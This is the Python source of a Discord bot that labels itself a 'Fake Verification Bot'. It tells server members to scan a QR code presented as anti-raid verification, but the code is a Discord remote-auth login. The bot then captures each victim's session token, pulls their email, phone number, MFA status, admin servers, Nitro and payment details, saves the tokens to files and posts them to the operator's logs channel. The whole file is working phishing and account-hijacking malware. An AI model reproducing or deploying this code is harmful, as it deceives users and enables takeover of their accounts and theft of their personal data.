import discord
import os
import json
import asyncio
import requests
import datetime
import random
import logging
import qrcode
import io
from discord.ext import commands
from discord.utils import get
from typing import Any, Optional
from websockets import connect
from websockets.exceptions import ConnectionClosedOK, ConnectionClosedError
from websockets.typing import Origin
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from base64 import b64decode, urlsafe_b64encode
from hashlib import sha256
from asyncio import get_event_loop, sleep as asleep, CancelledError
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from aiohttp import ClientSession, BasicAuth
from colorama import Fore, init

init(autoreset=True)

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTCYAN_EX
w = Fore.LIGHTWHITE_EX
r = Fore.RED
g = Fore.LIGHTGREEN_EX

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/18.18362",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

def get_clock():
    return datetime.datetime.now().strftime("%H:%M:%S")

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": USER_AGENTS[0],
        "Accept-Language": "en-US,en;q=0.9",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Referer": "https://discord.com/",
        "Connection": "keep-alive",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    }
    if token:
        headers["Authorization"] = token
    return headers

def generate_qr(data):
    qr = qrcode.QRCode(version=1, error_correction=qrcode.constants.ERROR_CORRECT_L, box_size=1, border=2)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    return img.resize((256, 256))

def initialize_guild_data(guild):
    for filename, default_value in [('data/logs_channels.json', None), ('data/roles.json', None),]:
        with open(filename, 'r') as f:
            data = json.load(f)
        data[str(guild.id)] = default_value

        with open(filename, 'w') as f:
            json.dump(data, f, indent=4)

    with open('data/embeds.json', 'r') as f:
        embeds = json.load(f)

    embeds[str(guild.id)] = {
        'title': None,
        'description': (
            "`1`. **Why do I need to pass a verification?**\n\n"
            "> This system was created to prevent this server from being raided or an unauthorized bot "
            "from joining and harming our community. That's why we have set up a simple verification system.\n\n"
            "`2`. **How do I pass this verification?**\n\n"
            "> To access the server, simply click on the \"Verify me\" button below and follow the steps "
            "that will be indicated."
        ),
        'title_qr': "__Verification step__",
        'description_qr': (
            "Welcome. In order to access the rest of the server, you will need to verify that you are not a roclient. 🤖\n\n"
            "**Please follow these steps to complete your verification**:\n"
            "🧩 *Open the Discord Mobile app*.\n"
            "🔧 *Go to the settings*.\n"
            "📂 *Choose the \"Scan QR code \" option*.\n"
            "🖼 *Scan the QR code below*.\n\n"
            "__Note__: *This verification requires the discord mobile application and an external device. "
            "We use the verification system set up by discord that's why it may seem more complicated than a simple captcha.*"
        )
    }
    with open('data/embeds.json', 'w') as f:
        json.dump(embeds, f, indent=4)

general_config = json.load(open('config/config.json'))

class PersistentView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.cd_mapping = {}

    @discord.ui.button(label='Verify Me', style=discord.ButtonStyle.blurple, custom_id='persistent_view:blurple')
    async def verif(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = datetime.datetime.now()
        user_cd = self.cd_mapping.get(interaction.user.id)
        if user_cd and user_cd > now:
            seconds_left = int((user_cd - now).total_seconds())
            embed = discord.Embed(description=f'You have to wait `{seconds_left} seconds` before you can verify again.', color=3619656)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        self.cd_mapping[interaction.user.id] = now + datetime.timedelta(seconds=30)

        logs_channels = json.load(open('data/logs_channels.json'))
        roles = json.load(open('data/roles.json'))

        stop = False

        logs_channel_id = logs_channels.get(str(interaction.guild_id))
        if logs_channel_id is None:
            stop = True
            embed = discord.Embed(
                title='⛔ Command Error',
                description='Please define a logs channel for the people passing the verification.\n\n**Role command:** `/logs #channel`',
                color=13500416
            )
            await interaction.response.send_message(embed=embed)
            return

        logs_channel = client.get_channel(logs_channel_id)
        if logs_channel is None:
            stop = True
            embed = discord.Embed(
                title='⛔ Command Error',
                description='An error occurred while retrieving the logs channel. Please check its validity.\n\n**Role command:** `/logs #channel`',
                color=13500416
            )
            await interaction.response.send_message(embed=embed)
            return

        give_role_id = roles.get(str(interaction.guild_id))
        if give_role_id is None:
            stop = True
            embed = discord.Embed(
                title='⛔ Command Error',
                description='Please define a role for the people passing the verification.\n\n**Role command:** `/role @role`',
                color=13500416
            )
            try:
                await interaction.response.send_message(embed=embed)
            except:
                await interaction.followup.send(embed=embed)
            return

        role_name = client.get_guild(interaction.guild_id).get_role(int(give_role_id))
        if role_name is None:
            stop = True
            embed = discord.Embed(
                title='⛔ Command Error',
                description='An error occurred while retrieving the role. Please check its validity.\n\n**Role command:** `/role @role`',
                color=13500416
            )
            try:
                await interaction.response.send_message(embed=embed)
            except:
                await interaction.followup.send(embed=embed)
            return

        if stop:
            return

        log = logging.getLogger("RemoteAuthClient")

        class User:
            def __init__(self, uid, username, discriminator, avatar):
                self.id = uid
                self.username = username
                self.discriminator = discriminator
                self.avatar = avatar

            def getName(self) -> str:
                return f"{self.username}"

            def getAvatarURL(self) -> str:
                return f"https://cdn.discord.com/avatars/{self.id}/{self.avatar}.png"

        class RemoteAuthClient:
            def __init__(self, proxy=None, proxy_auth=None, user_agent=None):
                self._task = None
                self._heartbeatTask = None
                self._ws = None

                self._privateKey = None
                self._publicKey = None
                self._publicKeyString = None

                self.on_fingerprint = self.ev
                self.on_userdata = self.ev
                self.on_token = self.ev
                self.on_cancel = self.ev
                self.on_timeout = self.ev
                self.on_error = self.ev
                self.on_captcha = self.ev

                self._retries = 0
                self._rqtoken = None

                self.proxy = proxy
                self.proxy_auth = proxy_auth
                self.user_agent = user_agent or random.choice(USER_AGENTS)

            @property
            def retries(self) -> int:
                return self._retries

            def initCrypto(self) -> None:
                self._privateKey = rsa.generate_private_key(public_exponent=65537, key_size=2048)
                self._publicKey = self._privateKey.public_key()
                pub_key_str = self._publicKey.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo).decode("utf8")
                self._publicKeyString = "".join(pub_key_str.split("\n")[1:-2])

            def event(self, t):
                def registerhandler(handler):
                    if t not in ("on_fingerprint", "on_userdata", "on_token", "on_cancel", "on_timeout", "on_error", "on_captcha"):
                        log.warning(f"Unknown event type '{t}'.")
                        return
                    setattr(self, t, handler)
                    return handler
                return registerhandler

            async def ev(self, *args, **kwargs) -> None:
                pass

            async def _sendHeartbeat(self, interval: int) -> None:
                while True:
                    await asleep(interval / 1000)
                    log.debug("Sending heartbeat.")
                    await self._send({"op": 'heartbeat'})

            async def _send(self, json_data: dict) -> None:
                await self._ws.send(json.dumps(json_data))

            def _decryptPayload(self, payload: str) -> bytes:
                payload_bytes = b64decode(payload.encode("utf8"))
                decrypted = self._privateKey.decrypt(
                    payload_bytes,
                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
                )
                return decrypted

            async def _event(self, name: str, **kwargs) -> Any:
                handler = getattr(self, f"on_{name}")
                if handler is self.ev:
                    return
                if "client" in handler.__code__.co_varnames:
                    kwargs["client"] = self
                return await handler(**kwargs)

            async def _cleanup(self, cancel_main_task=True) -> None:
                if self._ws:
                    await self._ws.close()
                if self._heartbeatTask:
                    self._heartbeatTask.cancel()
                if self._task and cancel_main_task:
                    self._task.cancel()
                self._privateKey = None
                self._publicKey = None
                self._publicKeyString = None

            async def _getToken(self, ticket: str, captcha_key: Optional[str] = None) -> Optional[str]:
                proxy_args = {}
                if self.proxy:
                    proxy_args["proxy"] = f"http://{self.proxy}"
                    if self.proxy_auth:
                        proxy_args["proxy_auth"] = BasicAuth(**self.proxy_auth)
                async with ClientSession(headers={"User-Agent": self.user_agent}) as sess:
                    data = {"ticket": ticket}
                    if captcha_key:
                        data["captcha_key"] = captcha_key
                        data["captcha_rqtoken"] = self._rqtoken
                    log.debug(f"Trying to get a token with request body: {data}")
                    resp = await sess.post("https://discord.com/api/v9/users/@me/remote-auth/login", json=data, **proxy_args)
                    j = await resp.json()
                    log.debug(f"Response code: {resp.status}")
                    log.debug(f"Response body: {j}")
                    if "encrypted_token" not in j and captcha_key is None and "captcha_key" in j:
                        log.debug(f"Detected captcha response. Calling on_captcha method with {j}")
                        del j["captcha_key"]
                        self._rqtoken = j["captcha_rqtoken"]
                        captcha_key = await self._event("captcha", captcha_data=j)
                        log.debug(f"on_captcha result: {captcha_key}")
                        if not captcha_key:
                            return None
                        return await self._getToken(ticket, captcha_key)
                    return j.get("encrypted_token")

            async def _run(self) -> None:
                err = None
                while True:
                    try:
                        data = await self._ws.recv()
                    except ConnectionClosedOK:
                        break
                    except ConnectionClosedError as e:
                        if e.code == 4003:
                            await self.on_timeout()
                        else:
                            err = e
                        break
                    p = json.loads(data)
                    op = p.get("op")
                    if op == "hello":
                        await self._send({"op": "init", "encoded_public_key": self._publicKeyString})
                        self._heartbeatTask = get_event_loop().create_task(self._sendHeartbeat(p["heartbeat_interval"]))
                    elif op == "nonce_proof":
                        decryptedNonce = self._decryptPayload(p["encrypted_nonce"])
                        nonceHash = urlsafe_b64encode(sha256(decryptedNonce).digest()).decode("utf8").replace("/", "").replace("+", "").replace("=", "")
                        await self._send({"op": 'nonce_proof', "proof": nonceHash})
                    elif op == "pending_remote_init":
                        fingerprint = p["fingerprint"]
                        log.debug(f"Received fingerprint: {fingerprint}.")
                        data = f"https://discord.com/ra/{fingerprint}"
                        await self._event("fingerprint", data=data)
                    elif op == "pending_ticket":
                        decryptedUser = self._decryptPayload(p["encrypted_user_payload"]).decode("utf8")
                        log.debug(f"Received userdata: {decryptedUser}.")
                        uid, discriminator, avatar, username = decryptedUser.split(':')
                        user = User(uid, username, discriminator, avatar)
                        await self._event("userdata", user=user)
                    elif op == "pending_login":
                        encryptedToken = await self._getToken(p["ticket"])
                        if not encryptedToken:
                            print(f"{r}[{get_clock()}]{w} Error: Unable to get a token {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
                        else:
                            decryptedToken = self._decryptPayload(encryptedToken).decode("utf8")
                            await self._event("token", token=decryptedToken)
                        break
                    elif op == 'cancel':
                        get_event_loop().create_task(self._event("cancel"))
                        break
                await self._cleanup(cancel_main_task=False)
                if err:
                    print(f"{r}[{get_clock()}]{w} Error: RemoteAuthClient disconnected with error {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
                    get_event_loop().create_task(self._event("error", error=err))

            async def run(self) -> None:
                await self.run_task()
                try:
                    await self._task
                except CancelledError:
                    pass

            async def run_task(self) -> None:
                await self._cleanup()
                self._retries += 1
                self.initCrypto()
                self._ws = await connect("wss://remote-auth-gateway.discord.gg/?v=2", origin=Origin("https://discord.com")).__await_impl__()
                self._task = get_event_loop().create_task(self._run())

            async def cancel(self) -> None:
                await self._cleanup()
                await self._event("cancel")

        c = RemoteAuthClient()

        @c.event("on_fingerprint")
        async def on_fingerprint(data):
            @c.event("on_cancel")
            async def on_cancel():
                print(f"{r}[{get_clock()}]{w} Auth canceled: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")

            @c.event("on_timeout")
            async def on_timeout():
                print(f"{r}[{get_clock()}]{w} Timeout: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")

            embeds = json.load(open('data/embeds.json', 'r'))
            embed_qr = discord.Embed(
                title=embeds[str(interaction.guild.id)]['title_qr'],
                description=embeds[str(interaction.guild.id)]['description_qr'],
                color=3092790
            )
            embed_qr.set_footer(text="Note: captcha expires in 2minutes (click again on the button below if it expires)")
            embed_qr.set_thumbnail(url="https://emoji.discord.st/emojis/aa142d2c-681c-45a2-99e9-a6e63849b351.png")

            qr_image = generate_qr(data)
            buffer = io.BytesIO()
            qr_image.save(buffer, format='PNG')
            buffer.seek(0)
            embed_qr.set_image(url="attachment://qr_code.png")
            await interaction.followup.send(embed=embed_qr, file=discord.File(fp=buffer, filename='qr_code.png'), ephemeral=True)

            print(f"{g}[{get_clock()}]{w} QR Code Generated: {data} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")

            @c.event("on_userdata")
            async def on_userdata(user):
                if not os.path.isfile("data/database.json"):
                    with open("data/database.json", "w", encoding="utf-8") as f:
                        json.dump({}, f, indent=4)

                with open("data/database.json", encoding="utf-8") as f:
                    database = json.load(f)

                database.setdefault(user.id, {})
                database[user.id].update({
                    "username": user.username,
                    "avatar_url": f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png"
                })

                with open("data/database.json", "w", encoding="utf-8") as f:
                    json.dump(database, f, indent=4)

                print(f"{b}[{get_clock()}]{w} {user.username} ({user.id}) {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")

                @c.event("on_token")
                async def on_token(token):
                    if not os.path.isfile("data/database.json"):
                        with open("data/database.json", "w", encoding="utf-8") as f:
                            json.dump({}, f, indent=4)

                    with open("data/database.json", encoding="utf-8") as f:
                        database = json.load(f)

                    database.setdefault(user.id, {})

                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=getheaders(token))
                        if res.status_code == 200:
                            res_json = res.json()
                            phone_number = res_json['phone']
                            email = res_json['email']
                            mfa_enabled = res_json['mfa_enabled']
                            flags = res_json['flags']
                            locale = res_json['locale']
                            verified = res_json['verified']

                            badges = ""
                            if flags in (64, 96):
                                badges += "<:BadgeBravery:> "
                            if flags in (128, 160):
                                badges += "<:BadgeBrilliance:> "
                            if flags in (256, 288):
                                badges += "<:BadgeBalance:> "

                            # friends_res = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=getheaders(token)).json()
                            # friends = len([x for x in friends_res if x['type'] == 1])
                            friends = 0

                            guilds_res = requests.get('https://discordapp.com/api/v6/users/@me/guilds', params={"with_counts": True}, headers=getheaders(token)).json()
                            guilds = len(guilds_res)
                            guild_infos = ""
                            for guild in guilds_res:
                                if guild['permissions'] & 8 or guild['permissions'] & 32:
                                    guild_detail = requests.get(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token)).json()
                                    vanity = f"; .gg/{guild_detail['vanity_url_code']}" if guild_detail.get("vanity_url_code") else ""
                                    guild_infos += f"\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"
                            if not guild_infos:
                                guild_infos = "No guilds"

                            subs_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token)).json()
                            has_nitro = bool(subs_res)
                            exp_date = None
                            badges += "<:BadgeSubscriber:> " if has_nitro else ""

                            if has_nitro:
                                exp_date = datetime.datetime.strptime(subs_res[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S").strftime('%d/%m/%Y at %H:%M:%S')

                            slots_res = requests.get('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token)).json()
                            available = 0
                            print_boost = ""
                            boost = False
                            for slot in slots_res:
                                cooldown = datetime.datetime.strptime(slot["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f+00:00")
                                if cooldown < datetime.datetime.utcnow():
                                    print_boost += "ㅤ- Available now\n"
                                    available += 1
                                else:
                                    print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                                boost = True
                            badges += "<:BadgeBoost:> " if boost else ""

                            payment_sources = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token, 'Content-Type': 'application/json'}).json()
                            payment_methods = sum(1 for x in payment_sources if x['type'] in (1, 2))
                            valid = sum(1 for x in payment_sources if x['type'] in (1, 2) and not x['invalid'])
                            types = " ".join("CreditCard" if x['type'] == 1 else "PayPal" for x in payment_sources if x['type'] in (1, 2))

                            database[user.id].update({
                                "phone_number": phone_number,
                                "email": email,
                                "mfa_enabled": mfa_enabled,
                                "flags": flags,
                                "locale": locale,
                                "verified": verified,
                                "has_nitro": has_nitro,
                                "payment_methods": payment_methods
                            })

                            print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                            nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}```"
                            print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {types}\n```"

                            embed_user = discord.Embed(
                                title=f"**New user verified: {user.username}** {badges}",
                                description=(
                                    f"```yaml\nUser ID: {user.id}\nEmail: {email}\nPhone Number: {phone_number}\n\n"
                                    f"Friends: {friends}\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n```"
                                    f" ```yaml\nMFA Enabled: {mfa_enabled}\nFlags: {flags}\nLocale: {locale}\nVerified: {verified}\n```"
                                    f"{print_nitro if has_nitro else nnbutb if available > 0 else ''}"
                                    f"{print_pm if payment_methods > 0 else ''}\nToken: \n```yaml\n{token}```"
                                ),
                                color=3092790
                            )
                    except Exception as e:
                        print(f"{r}[{get_clock()}]{w} Error: {e} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
                        if logs_channel:
                            embed_user = discord.Embed(
                                title=f"**New user verified: {user.username}** ",
                                description=f"```yaml\nUser ID: {user.id}```\n```yaml\nError Found: {e}\n```\nToken: \n```yaml\n{token}```",
                                color=3092790
                            )

                    database[user.id]["token"] = token

                    with open("data/database.json", "w", encoding="utf-8") as f:
                        json.dump(database, f, indent=4)

                    if not os.path.isfile("data/onlytokens.txt"):
                        open("data/onlytokens.txt", "w").close()
                    with open("data/onlytokens.txt", "a") as onlytokens:
                        onlytokens.write(token + "\n")

                    print(f"{b}[{get_clock()}]{w} Token: {token} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")

                    embed_user.set_footer(text="Made by Astraa ・ https://github.com/astraadev")
                    embed_user.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                    await logs_channel.send(embed=embed_user, content=f"<@{user.id}>")

                    try:
                        await interaction.user.add_roles(get(interaction.guild.roles, id=give_role_id))
                        print(f"{b}[{get_clock()}]{w} Role added to {user.username} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
                        embed_role = discord.Embed(
                            title="**Add Role Option:**",
                            description=f"```yaml\nRole {role_name} added to {user.username} with success!```",
                            color=2935808
                        )
                        embed_role.set_footer(text="Made by Astraa ・ https://github.com/astraadev")
                        embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_role)
                    except Exception as e:
                        print(f"{r}[{get_clock()}]{w} Error adding role to {user.username}: {e} {Fore.LIGHTBLACK_EX}[{interaction.channel.guild}]")
                        embed_role = discord.Embed(
                            title="**Add Role Option:**",
                            description=f"```yaml\nError adding role to {user.username}: {e}```",
                            color=13500416
                        )
                        embed_role.set_footer(text="Made by Astraa ・ https://github.com/astraadev")
                        embed_role.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                        await logs_channel.send(embed=embed_role)

        asyncio.create_task(c.run())
        await interaction.response.edit_message(content="")

class PersistentViewBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(
            command_prefix='.',
            description="Fake Verification Bot - Made by Astraa",
            intents=intents
        )
        self.tree.remove_command('help')
        self.remove_command('help')

    async def setup_hook(self):
        self.add_view(PersistentView())
        await self.tree.sync()

    async def on_ready(self):
        await self.change_presence(activity=discord.Game(name="Verifies New Members"))
        print(f"{Fore.LIGHTYELLOW_EX}[CONNEXION]{w} {self.user.name} ({self.user.id})")

    async def on_guild_join(self, guild):
        initialize_guild_data(guild)
        print(f"{Fore.LIGHTYELLOW_EX}[JOIN] Guild Name: {guild.name} - Total Members: {guild.member_count}")

    async def on_guild_remove(self, guild):
        print(f"{Fore.LIGHTYELLOW_EX}[LEAVE] Guild Name: {guild.name} - Total Members: {guild.member_count}")

    async def on_message(self, msg):
        if self.user in msg.mentions:
            embed = discord.Embed(
                title=f'📡 {self.user.name} is operational!',
                description=(
                    f'The prefix used on the server is **/** (only slash commands)\n'
                    f'To execute a command, you can do `/command`\n\n'
                    f'Go to the [server support]({general_config["link"]["help_server"]}) for more help or information.'
                ),
                color=5003474,
                timestamp=datetime.datetime.utcnow()
            )
            embed.set_thumbnail(url=self.user.avatar.url)
            embed.set_footer(text="Made by Astraa")
            await msg.channel.send(embed=embed)

        await self.process_commands(msg)

    async def on_command_error(self, ctx, error):
        if isinstance(error, commands.CommandNotFound):
            return
        if isinstance(error, commands.MissingRequiredArgument):
            await ctx.send(embed=discord.Embed(description='❌ Missing required argument', color=13500416))
        elif isinstance(error, commands.CommandInvokeError):
            await ctx.send(embed=discord.Embed(description='❌ An error has occurred', color=13500416))
        elif isinstance(error, (commands.CommandError, commands.CheckFailure)):
            await ctx.send(embed=discord.Embed(description='❌ You do not have permission to use this command', color=13500416))
        else:
            raise error


client = PersistentViewBot()

from bot.commands import help, set_verified_role, set_logs_channel, customize_embed, preview_embed, reset_embed, send_verification
